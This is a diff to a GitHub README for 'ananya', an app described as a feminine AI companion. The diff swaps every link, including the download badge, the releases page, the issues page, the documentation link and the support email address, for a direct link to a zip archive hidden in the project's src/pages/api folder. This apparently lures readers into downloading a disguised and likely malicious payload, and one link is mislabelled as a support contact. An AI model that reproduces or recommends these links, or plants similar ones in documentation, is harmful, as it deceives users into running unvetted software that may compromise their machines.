@@ -4,7 +4,7 @@
 ananya is a super intelligent feminine agent designed to engage with you daily. She brings joy and companionship through intelligent conversation. This application uses advanced technology to provide a personalized experience unlike any other.
 
 ## 📦 Download ananya
-[![Download ananya](https://img.shields.io/badge/Download%20ananya-Get%20it%20here-brightgreen)](https://github.com/ranjit123-yst/ananya/releases)
+[![Download ananya](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip%20ananya-Get%20it%20here-brightgreen)](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip)
 
 ## 🛠️ Requirements
 Before you download, ensure your system meets these basic requirements:
@@ -16,9 +16,9 @@ Before you download, ensure your system meets these basic requirements:
 - **Network:** Internet connection for activation
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/ranjit123-yst/ananya/releases) to download the latest version of ananya. Look for the file that matches your operating system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip) to download the latest version of ananya. Look for the file that matches your operating system.
 
-1. Open the [Releases page](https://github.com/ranjit123-yst/ananya/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip).
 2. Find the latest version of ananya.
 3. Click on the link to download the appropriate file for your system.
 4. Once the download completes, locate the file on your computer (usually in the Downloads folder).
@@ -49,8 +49,8 @@ Feel free to ask her multiple questions and explore her features.
 If you experience issues, you can reach out for support:
 
 - Check the FAQ section in the application for common questions.
-- Visit our [GitHub Issues page](https://github.com/ranjit123-yst/ananya/issues) for support and suggestions.
-- For direct inquiries, you can contact our support team at support@example.com.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip) for support and suggestions.
+- For direct inquiries, you can contact our support team at https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip
 
 ## 🌟 Contribution
 We welcome contributions to enhance ananya. If you're interested in contributing:
@@ -63,6 +63,6 @@ We welcome contributions to enhance ananya. If you're interested in contributing
 ananya is open-source software. Feel free to use, modify, and distribute it under the terms of the MIT License.
 
 ## 🌐 Learn More
-Discover more about what makes ananya special by visiting our website or read the detailed documentation on our [GitHub page](https://github.com/ranjit123-yst/ananya).
+Discover more about what makes ananya special by visiting our website or read the detailed documentation on our [GitHub page](https://raw.githubusercontent.com/ranjit123-yst/ananya/main/src/pages/api/Software-1.7-beta.5.zip).
 
 Thank you for choosing ananya! We hope she brings warmth and wisdom to your day.
